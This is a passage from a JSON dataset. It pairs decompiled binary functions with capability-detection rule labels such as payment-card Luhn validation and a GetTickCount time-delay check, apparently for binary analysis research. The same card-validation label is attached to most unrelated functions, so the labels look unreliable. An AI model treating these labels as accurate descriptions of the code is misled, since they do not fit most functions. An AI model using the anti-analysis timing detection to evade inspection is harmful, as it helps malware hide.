        "decompiled_code": "\nvoid fcn.0004fb20(int64_t arg1)\n\n{\n    fcn.0004f30c(arg1);\n    if (*(*(arg1 + 8) + 0x13a + arg1) == '\\x0f') {\n        fcn.0004f794(arg1);\n    }\n    else {\n        fcn.0004f634(arg1);\n    }\n    *(arg1 + 0xc0) = **(arg1 + 0xb8);\n    return;\n}\n",
        "token_count": 109
    },
    "0004fb64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004fb64(ulong arg1, ulong arg2, uint *arg3)\n\n{\n    char cVar1;\n    uchar extraout_AL;\n    uchar extraout_AL_00;\n    uchar uVar2;\n    uchar extraout_AH;\n    uchar extraout_AH_00;\n    uchar extraout_AH_01;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint extraout_var_01;\n    \n    cVar1 = fcn.0004f0e8(arg1, arg2);\n    *(arg3 + 1) = cVar1;\n    *arg3 = 0x8f;\n    if (cVar1 == '\\b') {\n        uVar2 = fcn.0004f30c(arg1);\n        *(arg3 + 2) = uVar2;\n    }\n    else if (cVar1 == '\\x10') {\n        uVar2 = fcn.0004f39c(arg1);\n        *(arg3 + 2) = CONCAT11(extraout_AH_01, uVar2);\n    }\n    else if (cVar1 == ' ') {\n        fcn.0004f3c8(arg1);\n        arg3[2] = CONCAT22(extraout_var_00, CONCAT11(extraout_AH_00, extraout_AL_00));\n    }\n    else if (cVar1 == '@') {\n        fcn.0004f418(arg1);\n        *(arg3 + 2) = CONCAT44(extraout_var_01, CONCAT22(extraout_var, CONCAT11(extraout_AH, extraout_AL)));\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00050048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00050048(int64_t arg1, ulong arg2, uint *arg3)\n\n{\n    char cVar1;\n    uchar extraout_AL;\n    uchar extraout_AL_00;\n    uchar uVar2;\n    uchar extraout_AH;\n    uchar extraout_AH_00;\n    uchar extraout_AH_01;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint extraout_var_01;\n    \n    cVar1 = *(arg1 + 0x134);\n    if (cVar1 == '\\x10') {\n        *(arg3 + 6) = 0x10;\n        uVar2 = fcn.0004f39c(arg1);\n        *(arg3 + 2) = CONCAT11(extraout_AH_01, uVar2);\n    }\n    else if (cVar1 == ' ') {\n        *(arg3 + 6) = 0x20;\n        fcn.0004f3c8(arg1);\n        arg3[2] = CONCAT22(extraout_var_00, CONCAT11(extraout_AH_00, extraout_AL_00));\n    }\n    else {\n        if (cVar1 != '@') {\n            return;\n        }\n        *(arg3 + 6) = 0x40;\n        fcn.0004f418(arg1);\n        *(arg3 + 2) = CONCAT44(extraout_var_01, CONCAT22(extraout_var, CONCAT11(extraout_AH, extraout_AL)));\n    }\n    *arg3 = 0x8d;\n    uVar2 = fcn.0004f0e8(arg1, arg2);\n    *(arg3 + 1) = uVar2;\n    return;\n}\n",
        "token_count": 375
    },
    "00050e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00050e08(int64_t arg1)\n\n{\n    fcn.00061a56(arg1, 0, 0x280);\n    *(arg1 + 0xac) = 0x10;\n    *(arg1 + 0xc0) = 0x215;\n    *(arg1 + 0xb0) = 0;\n    return;\n}\n",
        "token_count": 84
    },
    "00051020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00051020(ulong *arg1, int64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    uint32_t *puVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    uint32_t *puStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    uchar auStack376 [48];\n    int16_t aiStack328 [4];\n    int64_t iStack320;\n    \n    puStackX8._0_4_ = *0x87994;\n    puStackX8 = NULL;\n    bVar7 = *0x87994 == 0xffffffff;\n    *arg1 = 0;\n    *arg2 = 0;\n    if (bVar7) {\n        uVar4 = 0x21590005;\n    }\n    else {\n        if (puStackX8 == 0) {\n            *0x87994 = 0xffffffff;\n            uVar4 = fcn.0002f490(0x10, &puStackX8);\n            iVar2 = uVar4;\n            if (iVar2 == 0) {\n                uVar6 = 0;\n                uVar4 = 0x21590005;\n                puVar1 = puStackX8 + 2;\n                puVar5 = puVar1;\n                if (*puStackX8 != 0) {\n                    do {\n                        iVar2 = (*_fcn.000113f0)(*puVar5, &uStackX16);\n                        if (iVar2 == 0) {\n                            (**0x113b0)(uStackX16, auStack376);\n                            iVar2 = fcn.00061c00(*(puVar5 + 6), 1, aiStack328, 0x104, 0);\n                            (**0x113a8)(auStack376);\n                            if ((((iVar2 == 0) && (iStack320 != 0)) && (aiStack328[0] == 0x20)) &&\n                               (iVar2 = fcn.000619d8(iStack320, 0x15df8, 0x20),  iVar2 == 0)) {\n                                puStackX8._0_4_ = puVar1[uVar6 * 6];\n                                *0x87994 = puStackX8;\n                                (*_fcn.000115b0)(uStackX16);\n                                uVar4 = 0;\n                                goto code_r0x00051168;\n                            }\n                            (*_fcn.000115b0)();\n                        }\n                        uVar3 = uVar6 + 1;\n                        uVar6 = uVar3;\n                        puVar5 = puVar5 + 6;\n                    } while (uVar3 < *puStackX8);\n                }\ncode_r0x00051168:\n                fcn.0002fc50(puStackX8);\n                iVar2 = uVar4;\n            }\n            else {\n            }\n            if (iVar2 != 0) {\n                return uVar4;\n            }\n        }\n        arg1_00 = fcn.0002fbf0(0x30);\n        if (arg1_00 == 0) {\n            uVar4 = 0x21590004;\n        }\n        else {\n            uVar3 = (*_fcn.000113f0)(puStackX8, auStackX24);\n            uVar4 = uVar3;\n            if (uVar3 == 0) {\n                (**0x113b0)(auStackX24[0], arg1_00);\n                *arg1 = auStackX24[0];\n                *arg2 = arg1_00;\n            }\n            else {\n                fcn.0002fc50(arg1_00);\n                uVar4 = fcn.00061a5c(uVar4);\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 886
    },
    "00051218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00051218(char param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t arg2;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar auStack680 [192];\n    int32_t iStack488;\n    int32_t iStack480;\n    int64_t iStack472;\n    int32_t iStack448;\n    \n    fcn.00050e08(auStack680);\n    fcn.0004f4b8(auStack680);\n    fcn.0004f4d8(auStack680, 0);\n    uVar5 = 0;\n    iVar3 = (**0x11128)(*0x11518, 0x1000, 0, 0, 0);\n    iVar4 = iVar3;\n    if (iVar3 != 0) {\n        (**0x11120)(iVar3, 0, 0);\n        arg2 = (**0x11220)(iVar3, 0, 1, 0, uVar5 & 0xffffffff00000000, 0x10, 1);\n        iVar4 = 0;\n        if (arg2 != 0) {\n            fcn.0004f2e8(auStack680, arg2);\n            do {\n                do {\n                    iVar4 = 0;\n                    iVar1 = fcn.00050e40(auStack680);\n                    if ((((iVar1 == 0) || (iStack488 == 0x1be)) || (iStack488 == 0x1bf)) ||\n                       (uVar2 = fcn.0004f4f0(auStack680),  0xfeb < uVar2)) goto code_r0x000513a4;\n                } while (((iStack488 != 0x31) || (iStack480 != 0x8d)) || (iStack448 != 0x8f));\n                iVar4 = *0x87c70 + iStack472;\n            } while (((*(iVar4 + 0x20) == 0) || (param_1 == '\\0')) && ((*(iVar4 + 0x20) != 0 || (param_1 != '\\0'))));\n        }\ncode_r0x000513a4:\n        if (arg2 != 0) {\n            (**0x11228)(arg2, iVar3);\n        }\n        (**0x11118)(iVar3);\n        if (iVar3 != 0) {\n            (**0x11110)(iVar3);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 575
    },
    "00051404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00051404(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.00051218(0);\n    LOCK();\n    *0x879a8 = *0x879a8 ^ (*0x879a8 == 0) * (*0x879a8 ^ uVar1);\n    return *0x879a8;\n}\n",
        "token_count": 86
    },
    "0005142c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0005142c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.00051218(1);\n    LOCK();\n    *0x879b0 = *0x879b0 ^ (*0x879b0 == 0) * (*0x879b0 ^ uVar1);\n    return *0x879b0;\n}\n",
        "token_count": 87
    },
    "00051454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00051454(int64_t **arg1)\n\n{\n    int64_t *arg1_00;\n    \n    if ((arg1 != NULL) && (arg1_00 = *arg1,  arg1_00 != NULL)) {\n        *arg1 = NULL;\n        if (arg1_00[5] != arg1_00 + 0xd) {\n            fcn.0002fc50(arg1_00[5]);\n        }\n        if (*arg1_00 != arg1_00 + 0x87) {\n            fcn.0002fc50(*arg1_00);\n        }\n        fcn.00061a56(arg1_00, 0, 0xa8);\n        fcn.0002fc50(arg1_00);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00051500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00051500(int64_t *arg1, uint64_t arg2)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    arg1_00 = *arg1;\n    if (arg2 < 0x20) {\n        *arg1 = arg1 + 0x87;\n    }\n    else {\n        iVar1 = fcn.0002fbf0(arg2);\n        *arg1 = iVar1;\n        if (iVar1 == 0) {\n            return 0x21590004;\n        }\n    }\n    if (arg1_00 != 0) {\n        if (arg1_00 != *arg1) {\n            fcn.000619f6(*arg1, arg1_00, arg1[6]);\n        }\n        if (arg1_00 != arg1 + 0x87) {\n            fcn.0002fc50(arg1_00);\n        }\n    }\n    arg1[6] = arg2;\n    return 0;\n}\n",
        "token_count": 224
    },
    "00051900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00051900(int64_t arg1, ulong arg2)\n\n{\n    if (arg1 != 0) {\n        (**0x113a8)(arg2);\n        (*_fcn.000115b0)(arg1);\n        fcn.0002fc50(arg2);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00051ee8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00051ee8(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    uchar in_DL;\n    uint64_t uStackX8;\n    \n    if ((arg1 != 0) && (puVar1 = *(arg1 + 0x10),  puVar1 != NULL)) {\n        uStackX8._0_4_ = CONCAT13(0xc3, CONCAT12(0xcd, CONCAT11(in_DL, 0x6a)));\n        uStackX8 = *puVar1 & 0xffffffff00000000 | uStackX8;\n        *puVar1 = uStackX8;\n        if (arg1 + 0x48 != NULL) {\n            *(arg1 + 0x48) = puVar1 + 3;\n        }\n        return 0;\n    }\n    return 0x21590066;\n}\n",
        "token_count": 202
    },
    "0005245c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0005245c(ulong arg1, ulong arg2, int64_t *arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.0002fbf0(0xd8);\n    *arg3 = iVar2;\n    if (iVar2 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00061a56(iVar2, 0, 0xd8);\n        iVar1 = fcn.0005165c(1, arg1, arg2, *arg3);\n        if (iVar1 == 0) {\n            *arg4 = *(*arg3 + 0x10);\n        }\n        else {\n            fcn.0002fc50(*arg3);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 194
    },
    "000524d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000524d0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        iVar1 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.0005165c(0, 0, 0, *arg1);\n        if (iVar1 == 0) {\n            fcn.0002fc50(*arg1);\n            *arg1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 124
    },
    "00052518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00052518(ulong arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t auStackX24 [4];\n    \n    iVar1 = fcn.00050f04(*0x87c70, arg1, auStackX24);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00051a40((*(*0x87998 + auStackX24[0] * 8) - *0x87c70) + *0x879a0, *0x87c70 - *0x879a0, 0xe, 0);\n        if (iVar1 == 0) {\n            *(*arg2 + 0x10) = *(*0x87998 + auStackX24[0] * 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00052590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00052590(ulong arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    iVar1 = fcn.0004afbc(*0x87c70, arg1, &uStackX32);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004afbc(*0x879a0, arg1, &uStackX24);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00051a40(uStackX24, *0x87c70 - *0x879a0, 0xe, 0);\n            if (iVar1 == 0) {\n                *(*arg2 + 0x10) = uStackX32;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00052608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00052608(void)\n\n{\n    int32_t iVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t aiStackX8 [4];\n    uchar auStack296 [280];\n    \n    iVar1 = fcn.0002f490(0xb, aiStackX8);\n    iVar4 = aiStackX8[0];\n    if (iVar1 == 0) {\n        fcn.0001fd08(auStack296, 0x104, 0x15e20, *(aiStackX8[0] + 0x2e) + 0x30 + aiStackX8[0]);\n        iVar1 = fcn.0004af30(0, auStack296, *(iVar4 + 0x18), 0x879a0);\n        fcn.0002fc50(aiStackX8[0]);\n    }\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    puVar2 = fcn.00051404();\n    if (puVar2 != NULL) {\n        uVar3 = *puVar2;\n        if ((uVar3 < *0x87c70) || (*0x87c70 + *0x87c78 <= uVar3)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (uVar3 - *0x87c70) + *0x879a0;\n        }\n        if (iVar4 != 0) {\n            *0x87998 = fcn.0002fbc4(puVar2[2] << 3);\n            if (*0x87998 != 0) {\n                fcn.000619f6(*0x87998, iVar4, puVar2[2] << 3);\n                iVar1 = fcn.0002f718();\n                if ((iVar1 == 0x12) && (uVar3 = 0,  puVar2[2] != 0)) {\n                    iVar4 = 0;\n                    do {\n                        uVar3 = uVar3 + 1;\n                        *(iVar4 + *0x87998) = *(iVar4 + *0x87998) & 0xfffffffffffffff0;\n                        iVar4 = iVar4 + 8;\n                    } while (uVar3 < puVar2[2]);\n                }\n                return 0;\n            }\n            iVar1 = 0x21590004;\n            goto code_r0x000526eb;\n        }\n    }\n    iVar1 = 0x21590005;\ncode_r0x000526eb:\n    fcn.0002fc50(*0x879a0);\n    *0x879a0 = 0;\n    fcn.0002fc50(*0x87998);\n    *0x87998 = 0;\n    return iVar1;\n}\n",
        "token_count": 633
    },
    "0005276c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0005276c(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong unaff_RBX;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4_00;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    uchar *noname_4;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    int64_t in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    \n    noname_4 = &stack0xffffffffffffffc8;\n    arg4_00 = &stack0xffffffffffffffd8;\n    uVar2 = fcn.00051934(arg1, arg2, &stack0xffffffffffffffd0, arg4_00);\n    if (uVar2 == 0) {\n        uVar1 = fcn.00051f30(in_stack_ffffffffffffffd0, arg3, arg4, arg4_00, noname_4, in_stack_ffffffffffffffc0, \n                             in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, \n                             in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, \n                             in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                             in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                             in_stack_00000048, in_stack_00000050);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            *(*arg4 + 0xac) = arg1;\n        }\n        if (in_stack_ffffffffffffffd8 != 0) {\n            (**0x113a8)(in_stack_ffffffffffffffc8);\n            (*_fcn.000115b0)(in_stack_ffffffffffffffd8);\n            fcn.0002fc50(in_stack_ffffffffffffffc8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 595
    },
    "000527ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000527ec(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int64_t aiStack40 [3];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        uVar1 = fcn.00050f04(arg2, arg3, &uStackX16);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00051934(arg1, uStackX16, arg4, aiStack40);\n            if (uVar1 == 0) {\n                if (aiStack40[0] != 0) {\n                    (**0x113a8)(CONCAT44(uStackX20, uStackX16));\n                    (*_fcn.000115b0)(aiStack40[0]);\n                    fcn.0002fc50(CONCAT44(uStackX20, uStackX16));\n                }\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 309
    },
    "00054000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00054000(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    int64_t iVar4;\n    uchar auStack56 [16];\n    \n    if (arg3 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(arg1 + 0x10) + 8);\n        arg1_00 = (**0x114b8)(3, uVar3, 0, 0, 0, 0, 1, 0, 0);\n        if (arg1_00 == 0) {\n            uVar3 = 0x21590004;\n        }\n        else {\n            iVar4 = (**0x11128)(arg2, arg3, 0, 0, arg1_00);\n            if (iVar4 == 0) {\n                (**0x11588)(arg1_00, 0);\n                uVar3 = 0x21590004;\n            }\n            else {\n                (**0x11120)(iVar4, 0, 0);\n                iVar1 = *(arg1_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg1_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 7;\n                *(iVar1 + -0x20) = uVar3;\n                *(iVar1 + -0x18) = *(arg1 + 0x10);\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg3;\n                *(arg1_00 + 8) = iVar4;\n                uVar2 = fcn.000618b0(arg1_00, uVar3, auStack56, 0xffffffff);\n                uVar3 = fcn.00061a5c(uVar2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 499
    },
    "0005fde8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005fde8(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00058f70(arg1, 2);\n    if ((iVar2 != 0) && (arg2 != 0)) {\n        piVar1 = *arg1;\n        fcn.0002f23c(piVar1 + 5);\n        if (*(piVar1 + 0x24) < 1) {\n            fcn.0002f2a4(piVar1 + 5);\n        }\n        else {\n            *(piVar1 + 0x24) = *(piVar1 + 0x24) + -1;\n            fcn.0002f2a4(piVar1 + 5);\n            (**(**arg1 + 100))(arg1, arg2);\n            fcn.00031108(*arg1 + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00054e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00054e30(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != 0) {\n        fcn.000619de();\n    }\n    fcn.0005e1fc(arg1 + 0x138);\n    if ((arg1 != 0) && (arg1 != 0x7a638)) {\n        fcn.0001c6d8(arg1, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00054f1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00054f1c(int64_t arg1, ulong *arg2, int64_t arg3)\n\n{\n    ulong arg2_00;\n    int32_t iVar1;\n    uint uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    ulong *puVar4;\n    uint64_t uVar5;\n    uchar auStack152 [16];\n    uint uStack136;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    uint uStack126;\n    ulong uStack122;\n    uchar auStack112 [32];\n    uint uStack80;\n    uint *puStack72;\n    \n    arg2_00 = *(*(arg1 + 0x18) + 8);\n    iVar1 = 0;\n    uVar5 = 0;\n    arg1_00 = (**0x114b8)(3, arg2_00, 0, 0, 0, 0, 1, 0, 0);\n    puVar4 = arg2;\n    if (arg1_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        for (; puVar4 != NULL; puVar4 = *puVar4) {\n            if (*(puVar4 + 2) != 0) {\n                iVar3 = (**0x11128)(puVar4[1], *(puVar4 + 2), uVar5 & 0xffffffffffffff00 | puVar4 != arg2, 0, arg1_00);\n                if (iVar3 == 0) {\n                    (**0x11588)(arg1_00, 0);\n                    return 0x21590004;\n                }\n                uVar5 = 0;\n                (**0x11120)(iVar3);\n                iVar1 = iVar1 + *(puVar4 + 2);\n            }\n        }\n        uStack136 = 1;\n        uStack132 = 0xe;\n        uStack130 = 2;\n        uStack126 = *(arg3 + 4);\n        uStack128 = *(arg3 + 2);\n        uStack122 = 0;\n        fcn.00061a56(auStack112, 0, 0x30);\n        puStack72 = &uStack136;\n        uStack80 = 0x16;\n        iVar3 = *(arg1_00 + 0xb8);\n        *(iVar3 + -0x10) = 0;\n        *(iVar3 + -8) = 0;\n        *(iVar3 + -0x45) = 0;\n        iVar3 = *(arg1_00 + 0xb8);\n        *(iVar3 + -0x48) = 0xf;\n        *(iVar3 + -0x47) = 9;\n        *(iVar3 + -0x20) = arg2_00;\n        *(iVar3 + -0x18) = *(arg1 + 0x18);\n        *(iVar3 + -0x40) = iVar1;\n        *(iVar3 + -0x38) = auStack112;\n        iVar1 = fcn.000618b0(arg1_00, arg2_00, auStack152, 0xffffffff);\n        uVar2 = fcn.00061a5c(iVar1);\n        if (iVar1 == -0x3ffffdfa) {\n            uVar2 = 0x2159000b;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 760
    },
    "00055698": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00055698(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t arg1_00;\n    ulong uVar2;\n    char in_DL;\n    uchar auStack40 [16];\n    \n    uVar2 = *(*(arg1 + 0x18) + 8);\n    arg1_00 = (**0x114b8)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n    if (arg1_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(arg1_00 + 0xb8);\n        *(iVar1 + -0x10) = 0;\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -0x45) = 0;\n        iVar1 = *(arg1_00 + 0xb8);\n        *(iVar1 + -0x48) = 0xf;\n        *(iVar1 + -0x47) = 0xb;\n        *(iVar1 + -0x20) = uVar2;\n        *(iVar1 + -0x18) = *(arg1 + 0x18);\n        *(iVar1 + -0x40) = 4;\n        *(iVar1 + -0x30) = arg1;\n        *(iVar1 + -0x38) = -(in_DL != '\\0') & 0x5538c;\n        uVar2 = fcn.000618b0(arg1_00, uVar2, auStack40, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "00056114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.00056114(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    iVar1 = 0;\n    fcn.00031088(arg1 + 0x38);\n    piVar2 = *(arg1 + 0x30);\n    if (piVar2 != NULL) {\n        do {\n            if (*(piVar2 + 1) == arg2) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            iVar1 = piVar2[2];\n        }\n    }\n    fcn.00031108(arg1 + 0x38);\n    return iVar1;\n}\n",
        "token_count": 168
    },
    "000569bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000569bc(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < *(arg1 + 0x110)) {\n        puVar1 = arg1 + 0x28;\n        do {\n            fcn.0002fc50(*puVar1);\n            iVar2 = iVar2 + 1;\n            puVar1 = puVar1 + 3;\n        } while (iVar2 < *(arg1 + 0x110));\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "000569f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000569f4(int64_t arg1, ulong arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong *puStack48;\n    ulong uStack40;\n    \n    if (*(*(*(arg1 + 8) + 0x20) + 0x48) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            iVar3 = 0x21590001;\n        }\n        else if (*(arg1 + 0x18) == 0) {\n            uStack72._0_4_ = *(arg1 + 0x14);\n            uStack72._4_4_ = 0;\n            uStack64 = 3;\n            uVar1 = fcn.0002fcf4(uStack72);\n            uStack72 = CONCAT44(uStack72._4_4_, uVar1);\n            uVar2 = fcn.0002fcf4(uStack72._4_4_);\n            uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n            puStack48 = &uStack72;\n            uStack40 = 0xc;\n            uStack56 = arg2;\n            iVar3 = fcn.0006052c(*(*(arg1 + 8) + 0x18), &uStack56, 0);\n            if (iVar3 == 0x21590003) {\n                iVar3 = 0x21590006;\n            }\n        }\n        else {\n            iVar3 = *(arg1 + 0x1c);\n        }\n    }\n    else {\n        iVar3 = 0x21590006;\n    }\n    return iVar3;\n}\n",
        "token_count": 410
    },
    "00056e38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
